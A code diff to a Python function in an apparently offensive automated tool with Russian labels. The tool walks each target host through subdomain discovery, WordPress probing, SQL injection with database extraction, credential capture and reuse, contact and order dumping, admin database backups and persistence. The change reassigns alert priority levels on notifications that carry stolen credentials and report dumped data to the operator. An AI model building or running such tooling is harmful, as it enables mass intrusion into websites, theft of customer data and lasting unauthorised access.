@@ -245,7 +245,7 @@ def _work(host, st, use_browser, full):
         sd = _call(subdom.run, 90, host)[1] or []
         if sd:
             rec["notes"].append("поддомены: %d" % len(sd))
-            notify.send("ПОДДОМЕНЫ\n%s\n%s" % (host, ", ".join(sd[:5])))
+            notify.send_lvl(3, "ПОДДОМЕНЫ\n%s\n%s" % (host, ", ".join(sd[:5])))
 
     if kind == "wordpress" and score >= 0:
         _stage(st, host, "плагины", rec)
@@ -266,9 +266,11 @@ def _work(host, st, use_browser, full):
         if th:
             rec["notes"].append("шаблоны: %d" % len(th))
             score = min(12, score + min(4, sum(c for _, _, c in th) // 4))
-            loud = [(i, p) for i, p, c in th if c >= 6]
+            loud = [(i, p, c) for i, p, c in th if c >= 6]
             if loud:
-                notify.send("ЗАЦЕПКИ\n%s\n%s" % (host, "\n".join("%s: %s" % (i, p[:40]) for i, p in loud[:4])))
+                lvl = 2 if max(c for _, _, c in loud) >= 8 else 3
+                notify.send_lvl(lvl, "ЗАЦЕПКИ\n%s\n%s" % (
+                    host, "\n".join("%s: %s" % (i, p[:40]) for i, p, _ in loud[:4])))
 
     if score >= 2 and time.time() - t0 < 400:
         _stage(st, host, "файлы", rec)
@@ -287,7 +289,7 @@ def _work(host, st, use_browser, full):
                 if res:
                     rec["notes"].append(res[:80])
                     if "ВХОД" in res:
-                        notify.send("КРЕДЫ\n%s\n%s" % (host, res))
+                        notify.send_lvl(2, "КРЕДЫ\n%s\n%s" % (host, res))
 
     if score >= 2 and time.time() - t0 < 400:
         _stage(st, host, "инъекции", rec)
@@ -301,14 +303,14 @@ def _work(host, st, use_browser, full):
                     rec["notes"].append("вывод: %d" % len(ex))
                     loud = [f for f in ex if f["tag"] in ("extract:база", "extract:таблицы")]
                     if loud:
-                        notify.send("ИНЪЕКЦИЯ\n%s\n%s" % (host, loud[0]["extra"]))
+                        notify.send_lvl(2, "ИНЪЕКЦИЯ\n%s\n%s" % (host, loud[0]["extra"]))
 
     if score >= 4 and time.time() - t0 < 400:
         _stage(st, host, "архивы", rec)
         ah = _call(arch.run, 120, host)[1] or []
         if ah:
             rec["notes"].append("архив " + ah[0][1])
-            notify.send("АРХИВ\n%s\n%s" % (host, ah[0][0]))
+            notify.send_lvl(3, "АРХИВ\n%s\n%s" % (host, ah[0][0]))
 
     hits = []
     if time.time() - t0 < 500:
@@ -352,13 +354,13 @@ def _work(host, st, use_browser, full):
             if creds:
                 rec["creds"] = creds
                 rec["notes"].append("ВХОД")
-                notify.send("ВХОД\n%s\n%s\n%s" % (host, creds, kind))
+                notify.send_lvl(1, "ВХОД\n%s\n%s\n%s" % (host, creds, kind))
 
                 _stage(st, host, "повтор пар", rec)
                 rp = _call(reuse.run, 90, host, creds)[1] or []
                 if rp:
                     rec["notes"].append("повтор: " + ",".join(rp))
-                    notify.send("ПОВТОР ПАРОЛЯ\n%s\n%s" % (host, ", ".join(rp)))
+                    notify.send_lvl(2, "ПОВТОР ПАРОЛЯ\n%s\n%s" % (host, ", ".join(rp)))
 
                 if full:
                     _stage(st, host, "слив", rec)
@@ -366,7 +368,7 @@ def _work(host, st, use_browser, full):
                     if got:
                         n = got.rsplit(":", 1)[-1]
                         rec["notes"].append("слив %s" % n)
-                        notify.send("СЛИВ %s: %s контактов" % (host, n))
+                        notify.send_lvl(1, "СЛИВ %s: %s контактов" % (host, n))
 
                     if kind == "opencart":
                         _stage(st, host, "заказы", rec)
@@ -378,13 +380,13 @@ def _work(host, st, use_browser, full):
                         db = _call(admin.backup, 240, host, creds)[1] or ""
                         if db:
                             rec["notes"].append("БАЗА %d КБ" % (int(db.rsplit(":", 1)[-1]) // 1024))
-                            notify.send("БАЗА слита\n%s\n%s" % (host, db.rsplit(":", 1)[-1]))
+                            notify.send_lvl(1, "БАЗА слита\n%s\n%s" % (host, db.rsplit(":", 1)[-1]))
 
                         _stage(st, host, "закреп", rec)
                         kept = _call(keep.keep, 120, host, creds)[1] or ""
                         if kept:
                             rec["notes"].append("доступ: " + kept[:60])
-                            notify.send("ЗАКРЕПЛЕНИЕ\n%s\n%s" % (host, kept))
+                            notify.send_lvl(1, "ЗАКРЕПЛЕНИЕ\n%s\n%s" % (host, kept))
 
     rec.pop("stage", None)
     rec["done"] = True
